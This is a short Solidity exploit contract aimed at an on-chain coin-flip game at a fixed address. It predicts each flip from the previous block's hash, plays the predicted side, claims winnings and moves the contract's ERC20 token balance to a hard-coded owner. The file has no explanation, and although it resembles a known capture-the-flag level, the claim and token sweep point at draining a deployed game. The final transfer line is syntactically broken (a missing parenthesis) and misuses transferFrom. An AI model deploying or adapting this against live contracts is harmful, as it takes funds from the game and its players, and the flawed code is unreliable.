// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Flip {
  function flip(bool) external returns(bool);
  function claim() external;
}

contract CoinFlip {

  address immutable owner = 0xa561cC2c0C33FbEB03B7B89Fd435709e56b0C016;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flip() public returns (bool) {
    require(msg.sender == owner, "nope");
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    Flip(0x0a1a3E6f8e3fb2c52C68cC0d87D68b9ab339d5a7).flip(side);
    return side;
  }

  function claim() public {
    require(msg.sender == owner, "nope");
    Flip(0x0a1a3E6f8e3fb2c52C68cC0d87D68b9ab339d5a7).claim();
  }

  function transfer() public {
    require(msg.sender == owner, "nope");
    ERC20(0xa522196F3029692b53dC0E308cF1a0685CD6B471).transferFrom(address(this), owner, ERC20(0xa522196F3029692b53dC0E308cF1a0685CD6B471).balanceOf(address(this));
  }

}
